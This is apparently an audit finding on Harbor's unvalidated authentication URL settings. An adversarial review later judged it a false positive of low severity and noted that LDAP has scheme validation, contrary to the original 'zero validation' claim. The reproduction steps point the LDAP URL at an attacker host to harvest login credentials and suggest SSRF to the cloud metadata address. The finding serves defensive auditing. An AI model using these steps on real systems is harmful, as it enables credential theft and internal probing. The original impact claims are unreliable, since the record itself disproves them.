Phase: 8
Sequence: 027
Slug: config-url-no-validation
Verdict: FALSE POSITIVE (adversarial)
Rationale: Multiple URL-type configuration fields (LDAP, OIDC, authproxy, UAA endpoints) accept arbitrary strings with zero URL validation, enabling system admin to redirect authentication to attacker-controlled IdP for mass account takeover, or trigger SSRF to internal services on every auth attempt.
Severity-Original: HIGH
PoC-Status: pending
Pre-FP-Flag: none
Debate: security/chamber-workspace/chamber-02/debate.md
Adversarial-Verdict: DISPROVED
Adversarial-Rationale: Admin-only config fields for auth endpoints are intended functionality; URL validation cannot prevent a malicious admin from setting syntactically-valid but attacker-controlled endpoints; LDAP has scheme validation contradicting "zero validation" claim.
Severity-Final: LOW
PoC-Status: blocked

## Summary

Harbor's configuration system stores several URL-type fields as plain `StringType` or `NonEmptyStringType` with no URL validation whatsoever. A system administrator can set LDAP URL, OIDC endpoint, authproxy endpoint, authproxy token review endpoint, or UAA endpoint to arbitrary internal or attacker-controlled URLs. When the corresponding authentication mode is activated, Harbor makes outbound HTTP/LDAP requests to these attacker-controlled endpoints, enabling IdP pivot (redirecting all authentication to attacker server) or SSRF (targeting internal services on every authentication attempt).

## Location

- `src/lib/config/metadata/metadatalist.go:96` -- `LDAPURL` as `NonEmptyStringType`
- `src/lib/config/metadata/metadatalist.go:139` -- `OIDCEndpoint` as `StringType`
- `src/lib/config/metadata/metadatalist.go:130` -- `HTTPAuthProxyEndpoint` as `StringType`
- `src/lib/config/metadata/metadatalist.go:131` -- `HTTPAuthProxyTokenReviewEndpoint` as `StringType`
- `src/lib/config/metadata/metadatalist.go:127` -- `UAAEndpoint` as `StringType`
- `src/controller/config/controller.go:115-147` -- `validateCfg` performs no URL validation on any of these fields

## Attacker Control

- System admin sets config values via `PUT /api/v2.0/configurations`
- No URL validation: accepts `http://169.254.169.254/`, `ftp://`, `file:///`, or any string
- Outbound requests triggered on every authentication attempt when corresponding auth mode is active

## Trust Boundary Crossed

- TB-7: Core API to external auth providers (attacker-controlled)
- Authentication trust chain redirected to attacker infrastructure

## Impact

- **IdP Pivot**: Attacker LDAP server accepts any credentials -> mass account takeover
- **Token Forge**: Attacker OIDC provider issues tokens with arbitrary claims -> impersonate any user
- **SSRF Oracle**: Authproxy endpoint triggers HTTP request on every login -> high-frequency internal service probing
- **Credential Harvest**: LDAP bind operations send user credentials to attacker LDAP server

## Evidence

- Deep Probe PH-18: Validated via game theory reasoning
- metadatalist.go: All URL fields use StringType, not a URL-validating type
- validateCfg (controller.go:115-147): Validates auth mode, value length, skip-audit -- NOT URLs
- Contrast with webhook/scanner URLs that at least check scheme via ValidateHTTPURL

## Reproduction Steps

1. Authenticate as system administrator
2. Set LDAP URL: `PUT /api/v2.0/configurations` with `{"auth_mode": "ldap_auth", "ldap_url": "ldap://attacker.example.com"}`
3. Any user attempts LDAP login -> credentials sent to attacker's LDAP server
4. For OIDC: set `oidc_endpoint` to attacker's server, observe `GET /.well-known/openid-configuration`
5. For authproxy: set `http_authproxy_endpoint` to internal IP, observe SSRF on every login
